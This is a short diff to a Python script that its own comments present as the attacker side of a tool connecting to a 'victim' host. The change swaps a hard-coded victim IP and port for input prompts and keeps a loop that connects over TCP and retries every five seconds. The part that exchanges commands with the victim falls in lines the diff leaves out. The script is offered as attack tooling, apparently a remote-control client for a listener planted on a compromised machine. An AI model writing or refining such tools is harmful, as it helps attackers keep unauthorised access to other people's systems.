@@ -1,20 +1,19 @@
 import socket
 import logging
 
-# Attacker Configuration
-VICTIM_HOST = "10.0.0.20"  # Change to the victim's IP
-VICTIM_PORT = 9999  # Port the victim is listening on
-
 # Configure logging
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
 
-
 def main():
+    # Prompt the user for victim's IP address and port
+    victim_host = input("Enter the victim's IP address: ").strip()
+    victim_port = int(input("Enter the victim's port: ").strip())
+
     while True:
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as attacker_socket:
-                logging.info(f"Attempting to connect to victim at {VICTIM_HOST}:{VICTIM_PORT}")
-                attacker_socket.connect((VICTIM_HOST, VICTIM_PORT))
+                logging.info(f"Attempting to connect to victim at {victim_host}:{victim_port}")
+                attacker_socket.connect((victim_host, victim_port))
                 logging.info("Connection established.")
 
                 while True:
@@ -50,7 +49,6 @@ def main():
             logging.info("Retrying connection in 5 seconds...")
             import time
             time.sleep(5)
-
 
 if __name__ == "__main__":
     main()
